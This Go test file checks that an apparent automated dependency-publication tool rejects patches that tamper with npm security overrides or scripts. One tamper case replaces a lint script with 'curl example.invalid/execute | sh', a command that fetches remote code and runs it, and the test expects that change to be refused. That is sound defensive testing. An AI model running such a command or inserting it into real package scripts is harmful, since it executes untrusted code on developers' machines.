// Copyright 2026 Microsoft Corporation
// Licensed under the Apache License, Version 2.0.

package dependabot

import (
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
)

// TestNativePublicationIntegrationNPMScopes retains mixed-major parent-scoped security overrides through actual publication.
func TestNativePublicationIntegrationNPMScopes(t *testing.T) {
	for _, mode := range []string{"preserved scopes", "wrong parent resolution", "removed security override", "changed script"} {
		t.Run(mode, func(t *testing.T) {
			f := newNativeIntegrationFixture(t)
			before := `{"scripts":{"lint":"prettier --check ."},"devDependencies":{"@apidevtools/swagger-parser":"12.0.0","prettier":"3.9.9"},"overrides":{"js-yaml@^3":"^3.15.2","js-yaml@^4":"^4.3.2","ajv@>=7.0.0-alpha.0":"^8.18.0","minimatch":"^3.1.3","oav":{"ajv":"^6.12.6","@apidevtools/swagger-parser":{"ajv":"^8.18.0"}}}}` + "\n"
			versions := map[string]string{"prettier": "3.9.9", "js-yaml": "4.3.2", "ajv": "8.18.0", "oav": "4.0.4", "@apidevtools/swagger-parser": "12.0.0", "minimatch": "3.1.5", "glob": "13.0.0", "glob/node_modules/minimatch": "10.2.5", "oav/node_modules/ajv": "6.12.6", "oav/node_modules/js-yaml": "3.15.2"}
			packages := map[string]any{}
			for name, version := range versions {
				packages["node_modules/"+name] = map[string]any{"version": version}
			}
			lock := map[string]any{"lockfileVersion": 3, "packages": packages}
			lockBytes, err := json.Marshal(lock)
			if err != nil {
				t.Fatal(err)
			}
			f.write("api/package.json", before)
			f.write("api/package-lock.json", string(lockBytes)+"\n")
			f.commit("trusted npm security scopes")
			f.base = f.git("rev-parse", "HEAD")
			f.git("push", f.remote, "HEAD:refs/heads/main")
			after := strings.ReplaceAll(before, "3.9.9", "3.9.10")
			sha := f.addSource(2, "api/package.json", after)
			f.branch = "native-dependabot-" + fmt.Sprintf("%x", sha256.Sum256([]byte("npm:prettier")))[:24]
			packages["node_modules/prettier"].(map[string]any)["version"] = "3.9.11"
			switch mode {
			case "wrong parent resolution":
				packages["node_modules/oav/node_modules/ajv"].(map[string]any)["version"] = "8.18.0"
			case "removed security override":
				after = strings.Replace(after, `"minimatch":"^3.1.3",`, "", 1)
			case "changed script":
				after = strings.Replace(after, "prettier --check .", "curl example.invalid/execute | sh", 1)
			}
			lockBytes, err = json.Marshal(lock)
			if err != nil {
				t.Fatal(err)
			}
			f.write("api/package.json", after)
			f.write("api/package-lock.json", string(lockBytes)+"\n")
			patch := f.git("diff") + "\n"
			f.git("restore", ".")
			request := &NativePublicationRequest{request: nativePublicationRequest{SourcePRs: []nativePublicationSource{{Number: 2, HeadSHA: sha}}, ExpectedBaseSHA: f.base, Patch: patch, Title: "chore(deps): update prettier for @apidevtools/swagger-parser", Body: "Preserve @apidevtools/swagger-parser security scopes. Unicode: café."}}
			result, err := f.publish(request)
			if mode != "preserved scopes" {
				if err == nil {
					t.Fatal("security change published")
				}
				if len(f.writes) != 0 || f.remoteGit("for-each-ref", "--format=%(refname)", "refs/heads/native-dependabot-") != "" {
					t.Fatalf("security rejection mutated publication: %v", f.writes)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			head := result["head_sha"].(string)
			if f.remoteGit("show", head+":api/package.json") != strings.TrimSpace(after) || f.remoteGit("show", head+":api/package-lock.json") != string(lockBytes) {
				t.Fatal("publication altered scoped npm bytes")
			}
			if !strings.Contains(f.pulls[100]["body"].(string), "＠apidevtools/swagger-parser") || !strings.Contains(f.pulls[100]["body"].(string), "café") {
				t.Fatal("publication changed safe Unicode metadata")
			}
		})
	}
}
